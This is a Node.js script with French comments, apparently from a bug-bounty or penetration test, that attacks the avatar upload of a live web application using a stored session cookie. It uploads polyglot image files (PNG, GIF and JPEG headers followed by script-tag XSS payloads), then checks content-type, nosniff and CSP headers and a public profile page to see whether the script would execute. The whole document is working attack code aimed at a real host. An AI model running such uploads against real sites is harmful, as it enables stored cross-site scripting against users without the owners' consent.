// CYBERAAR : avatar — le serveur sniff-t-il le contenu ? accepte-t-il une POLYGLOTTE ?
// et comment le fichier est-il servi (content-type, nosniff, inline, CSP) ?
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.readFileSync("/tmp/opencode/cyberaar/session-alias.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const b64 = (s) => Buffer.from(s, "base64");
// PNG 1x1 valide (CRCs corrects)
const PNG_OK = b64("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==");
// GIF89a valide 1x1
const GIF_OK = b64("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
// polyglotte : en-tete PNG + HTML/JS ensuite
const POLY_PNG = Buffer.concat([PNG_OK.subarray(0, 40), Buffer.from("<script>alert(document.domain)</script>", "utf8")]);
// polyglotte : en-tete GIF + JS
const POLY_GIF = Buffer.concat([GIF_OK.subarray(0, 6), Buffer.from("<script>alert(document.domain)</script>", "utf8")]);
// JPEG (magic) + HTML
const POLY_JPG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.from("<script>alert(1)</script>")]);

async function up(label, filename, type, content) {
  const fd = new FormData();
  fd.append("file", new Blob([content], { type }), filename);
  for (let i = 0; i < 3; i++) {
    try {
      const t0 = Date.now();
      const r = await fetch(APP + "/api/aarme/account/avatar", { method: "POST", headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE }, body: fd, redirect: "manual", signal: AbortSignal.timeout(30000) });
      const t = await r.text();
      console.log("  " + label.padEnd(44) + "HTTP " + r.status + " " + String(Date.now() - t0).padStart(5) + "ms  " + t.replace(/\s+/g, " ").slice(0, 240));
      return { s: r.status, txt: t };
    } catch (e) { await sleep(4000); }
  }
  console.log("  " + label.padEnd(44) + "ERR reseau");
  return { s: 0, txt: "ERR" };
}
console.log("=== upload d avatar : sniffing de contenu et polyglottes ===\n");
const a1 = await up("1. PNG 1x1 VALIDE (controle)", "photo.png", "image/png", PNG_OK);
await sleep(20000);
const a2 = await up("2. GIF 1x1 VALIDE (controle)", "photo.gif", "image/gif", GIF_OK);
await sleep(20000);
const a3 = await up("3. polyglotte PNG+HTML", "poly.png", "image/png", POLY_PNG);
await sleep(20000);
const a4 = await up("4. polyglotte GIF+HTML", "poly.gif", "image/gif", POLY_GIF);
await sleep(20000);
const a5 = await up("5. JPEG magic + HTML", "poly.jpg", "image/jpeg", POLY_JPG);
await sleep(20000);

console.log("\n=== ou et comment l avatar est-il servi ? ===");
let url = "";
for (const r of [a1, a2, a3, a4, a5]) {
  if (r.s === 200) { try { const j = JSON.parse(r.txt); url = j.url || j.avatar_url || j.avatar || j.path || ""; if (url) { console.log("  reponse : " + r.txt.replace(/\s+/g, " ").slice(0, 220)); break; } } catch {} }
}
if (!url) {
  const me = await fetch(APP + "/api/aarme/account/me", { headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Cookie: COOKIE } });
  const mt = await me.text();
  const m = mt.match(/"avatar":\s*("(?:[^"\\]|\\.)*"|null)/);
  url = m && m[1] !== "null" ? JSON.parse(m[1]) : "";
  console.log("  /me : avatar = " + (url || "(vide)"));
}
if (url) {
  const full = url.startsWith("http") ? url : APP + url;
  const h = await fetch(full, { headers: { "User-Agent": UA }, redirect: "manual" });
  const hh = h.headers;
  console.log("  GET " + full.replace(/^https?:\/\//, "").slice(0, 80));
  console.log("     HTTP " + h.status + " | content-type: " + (hh.get("content-type") || "-"));
  console.log("     content-disposition: " + (hh.get("content-disposition") || "-") + " | nosniff: " + (hh.get("x-content-type-options") || "-"));
  console.log("     csp: " + (hh.get("content-security-policy") || "(aucune)").slice(0, 200));
  const body = await h.text();
  console.log("     corps (120 premiers car.) : " + body.replace(/\s+/g, " ").slice(0, 120));
  // la page publique du profil contient-elle l image ?
  const pub = await fetch("https://aarme.cyberaar.io/h/bb-probe-ssrf", { headers: { "User-Agent": UA } });
  const pt = await pub.text();
  console.log("  le profil public reference-t-il l avatar ? " + (pt.includes(url.split("/").pop()) ? "OUI" : "non / avatar non definissable"));
}
